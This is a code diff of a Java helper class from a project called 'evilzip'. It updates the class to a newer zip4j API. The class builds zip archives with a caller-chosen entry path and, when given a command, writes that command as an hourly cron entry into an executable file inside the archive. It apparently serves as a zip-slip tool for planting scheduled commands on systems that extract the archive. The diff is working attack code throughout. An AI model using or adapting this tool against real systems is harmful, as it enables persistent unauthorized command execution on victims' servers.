@@ -1,13 +1,16 @@
 package net.thekingofduck.core;
 
-import net.lingala.zip4j.core.ZipFile;
+import net.lingala.zip4j.ZipFile;
 import net.lingala.zip4j.model.ZipParameters;
-import net.lingala.zip4j.util.Zip4jConstants;
 import org.apache.commons.lang.StringUtils;
 
-import java.io.ByteArrayInputStream;
-import java.io.File;
-import java.io.InputStream;
+import java.io.*;
+import java.nio.charset.StandardCharsets;
+
+import static net.lingala.zip4j.model.enums.AesKeyStrength.KEY_STRENGTH_256;
+import static net.lingala.zip4j.model.enums.CompressionLevel.*;
+import static net.lingala.zip4j.model.enums.CompressionMethod.*;
+import static net.lingala.zip4j.model.enums.EncryptionMethod.AES;
 
 /**
  * Project: evilzip
@@ -21,34 +24,38 @@ public class ZipHelper {
 
     public static void compress(String inputFile,String fullpath,String password,String cmd,String savePath) throws Exception {
 
-        InputStream inputStream = null;
+
         File file  = new File(savePath);
         file.delete();
 
-        ZipFile zip = new ZipFile(savePath);
+        ZipFile zip = null;
         ZipParameters parameters = new ZipParameters();
-        parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE);
-        parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL);
+
+        if (StringUtils.isNotBlank(password)&&StringUtils.isNotEmpty(password)){
+            zip = new ZipFile(savePath,password.toCharArray());
+            parameters.setEncryptFiles(true);
+            parameters.setEncryptionMethod(AES);
+            parameters.setAesKeyStrength(KEY_STRENGTH_256);
+        }else {
+            zip = new ZipFile(savePath);
+        }
+
+        parameters.setCompressionMethod(STORE);
+        parameters.setCompressionLevel(NORMAL);
         parameters.setFileNameInZip(fullpath);
 
-        if (StringUtils.isNotBlank(password)){
-            parameters.setEncryptFiles( true );
-            parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES);
-            parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256);
-            parameters.setPassword(password);
-        }
-        parameters.setSourceExternalStream(true);
-
         if (StringUtils.isNotBlank(cmd)){
-            inputStream = new ByteArrayInputStream(String.format("* */1 * * * %s",cmd).getBytes());
-            zip.addStream(inputStream, parameters);
-        }else {
-            zip.addFile(new File(inputFile), parameters);
+            String payload = String.format("* */1 * * * %s",cmd);
+            FileOutputStream fileOutputStream = new FileOutputStream(inputFile);
+            fileOutputStream.write(payload.getBytes(StandardCharsets.UTF_8));
+            fileOutputStream.flush();
+            fileOutputStream.close();
         }
 
-        if (inputStream != null) {
-            inputStream.close();
-        }
-
+        File in = new File(inputFile);
+        in.setExecutable(true);
+        in.setReadable(true);
+        in.setWritable(true);
+        zip.addFile(in, parameters);
     }
 }
